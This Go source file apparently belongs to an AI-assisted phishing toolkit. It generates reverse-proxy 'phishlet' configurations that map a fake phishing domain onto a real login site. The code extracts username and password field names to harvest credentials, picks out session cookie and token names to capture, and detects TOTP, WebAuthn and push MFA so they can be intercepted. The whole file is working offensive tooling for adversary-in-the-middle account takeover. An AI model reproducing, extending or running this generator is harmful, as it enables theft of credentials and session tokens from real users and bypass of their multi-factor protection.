// Package phishgen — AI-assisted генератор фишлетов.
// Слой 1 (детерминированный): эвристики по origin-хосту и HTML-сэмплу —
// формы (action/input names), кандидаты cookie/токенов из JS, creds_map.
// Слой 2 (llm.go): refine через OpenAI-совместимый API (Ollama/OpenAI).
// Вывод всегда проходит Validate спека перед возвратом.
package phishgen

import (
	"fmt"
	"regexp"
	"sort"
	"strings"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/core/phishlet"
	"gopkg.in/yaml.v3"
)

// Input — вход генератора.
type Input struct {
	ID       string // [a-z0-9_-]+
	Origin   string // login.example.com
	Domain   string // login.phish.test (фиш-домен)
	PhishSub string // login (дефолт)
	HTML     string // опциональный сэмпл страницы
}

var (
	formActionRe = regexp.MustCompile(`(?i)<form[^>]*action=["']([^"']+)["']`)
	inputNameRe  = regexp.MustCompile(`(?i)<input[^>]*name=["']([^"']+)["']`)
	inputTypeRe  = regexp.MustCompile(`(?i)<input[^>]*type=["'](password|email|text|tel)["'][^>]*name=["']([^"']+)["']`)
	cookieRe     = regexp.MustCompile(`(?i)(?:document\.cookie|getCookie\(|cookies\[|cookies\.get\(|localStorage\.getItem\(|sessionStorage\.getItem\()\s*["']([A-Za-z0-9_\-]{3,40})["']?`)
	tokenNameRe  = regexp.MustCompile(`(?i)\b([A-Za-z0-9_]*(?:token|auth|session|sid|sid_|sess)[A-Za-z0-9_]*)\b`)
	passNames    = []string{"password", "passwd", "pass", "pwd", "secret"}
	loginNames   = []string{"login", "username", "user", "email", "account", "phone"}
)

// GenerateYAML строит Phishlet v2 YAML эвристиками и валидирует спеком.
func GenerateYAML(in Input) (string, error) {
	p, err := Generate(in)
	if err != nil {
		return "", err
	}
	if err := phishlet.Validate(p); err != nil {
		return "", fmt.Errorf("generated invalid: %w", err)
	}
	b, err := yaml.Marshal(p)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

// Generate строит структуру.
func Generate(in Input) (*core.Phishlet, error) {
	if in.ID == "" || strings.ContainsAny(in.ID, " \t/") {
		return nil, fmt.Errorf("bad id %q", in.ID)
	}
	origSub, origDomain, err := splitHost(in.Origin)
	if err != nil {
		return nil, err
	}
	sub := in.PhishSub
	if sub == "" {
		sub = "login"
	}
	phishHost := sub + "." + in.Domain
	p := &core.Phishlet{
		ID:          in.ID,
		Version:     2,
		BaseDomains: []string{in.Domain},
		ProxyHosts: []core.ProxyHost{{
			PhishSub: sub, OrigSub: origSub, Domain: origDomain, IsLanding: true,
		}},
		SubFilters: []core.SubFilter{{
			TriggersOn: in.Origin, Search: in.Origin, Replace: phishHost,
			Mime: []string{"text/html", "application/json"}, RedirectOnly: false,
		}},
		LurePath: "/l/" + in.ID + "-01",
		Enabled:  true,
	}
	creds := credsFromHTML(in.HTML)
	if len(creds) == 0 {
		creds = []core.CredsRule{{Key: "login", Search: "login"}, {Key: "passwd", Search: "passwd"}}
	}
	p.CredsMap = creds
	if toks := tokensFromHTML(in.HTML); len(toks) > 0 {
		p.AuthTokens = []core.AuthToken{{Domain: "." + origDomain, Keys: toks}}
	}
	if mfa := mfaFromHTML(in.HTML); len(mfa) > 0 {
		p.MfaTokens = mfa
	}
	return p, nil
}

func splitHost(host string) (sub, domain string, err error) {
	host = strings.ToLower(strings.TrimSpace(strings.Trim(host, ".")))
	if i := strings.Index(host, ":"); i >= 0 {
		host = host[:i]
	}
	parts := strings.Split(host, ".")
	if len(parts) < 2 {
		return "", "", fmt.Errorf("bad origin host %q", host)
	}
	return parts[0], strings.Join(parts[1:], "."), nil
}

// credsFromHTML ищет input names: password-типы -> passwd, login-типы -> login.
func credsFromHTML(html string) []core.CredsRule {
	if html == "" {
		return nil
	}
	low := strings.ToLower(html)
	var out []core.CredsRule
	seen := map[string]bool{}
	add := func(key, search string) {
		if !seen[key+search] {
			seen[key+search] = true
			out = append(out, core.CredsRule{Key: key, Search: search})
		}
	}
	for _, m := range inputTypeRe.FindAllStringSubmatch(html, -1) {
		typ, name := strings.ToLower(m[1]), m[2]
		switch typ {
		case "password":
			add("passwd", name)
		case "email", "tel":
			add("login", name)
		default:
			if containsStr(loginNames, strings.ToLower(name)) {
				add("login", name)
			}
		}
		_ = low
	}
	for _, m := range inputNameRe.FindAllStringSubmatch(html, -1) {
		name := m[1]
		ln := strings.ToLower(name)
		if containsStr(passNames, ln) {
			add("passwd", name)
		} else if containsStr(loginNames, ln) {
			add("login", name)
		}
	}
	return out
}

// tokensFromHTML: cookie/localStorage-имена + token-like идентификаторы.
func tokensFromHTML(html string) []string {
	if html == "" {
		return nil
	}
	set := map[string]bool{}
	for _, m := range cookieRe.FindAllStringSubmatch(html, 8) {
		set[m[1]] = true
	}
	for _, m := range tokenNameRe.FindAllStringSubmatch(html, 12) {
		name := m[1]
		if len(name) >= 5 && !isCommonWord(name) {
			set[name] = true
		}
	}
	out := make([]string, 0, len(set))
	for k := range set {
		out = append(out, k)
	}
	sort.Strings(out)
	if len(out) > 8 {
		out = out[:8]
	}
	return out
}

// mfaFromHTML: признаки второго фактора в разметке.
func mfaFromHTML(html string) []core.MfaRule {
	low := strings.ToLower(html)
	var out []core.MfaRule
	if strings.Contains(low, "totp") || strings.Contains(low, "authenticator") || strings.Contains(low, "otp") {
		out = append(out, core.MfaRule{Key: "totp", Search: "totp"})
	}
	if strings.Contains(low, "webauthn") || strings.Contains(low, "publickeycredential") || strings.Contains(low, "authenticatorassertionresponse") {
		out = append(out, core.MfaRule{Key: "webauthn", Search: "authenticatorAssertionResponse"})
	}
	if strings.Contains(low, "push") && (strings.Contains(low, "approve") || strings.Contains(low, "push")) && strings.Contains(low, "mfa") {
		out = append(out, core.MfaRule{Key: "push", Search: "push"})
	}
	return out
}

var commonWords = map[string]bool{
	"token": true, "auth": true, "session": true, "csrf": true,
	"client": true, "request": true, "response": true,
}

func isCommonWord(s string) bool { return commonWords[strings.ToLower(s)] }

func containsStr(list []string, s string) bool {
	for _, v := range list {
		if v == s {
			return true
		}
	}
	return false
}

// formActions возвращает action форм (для будущих sub_filters).
func formActions(html string) []string {
	var out []string
	for _, m := range formActionRe.FindAllStringSubmatch(html, 8) {
		out = append(out, m[1])
	}
	return out
}
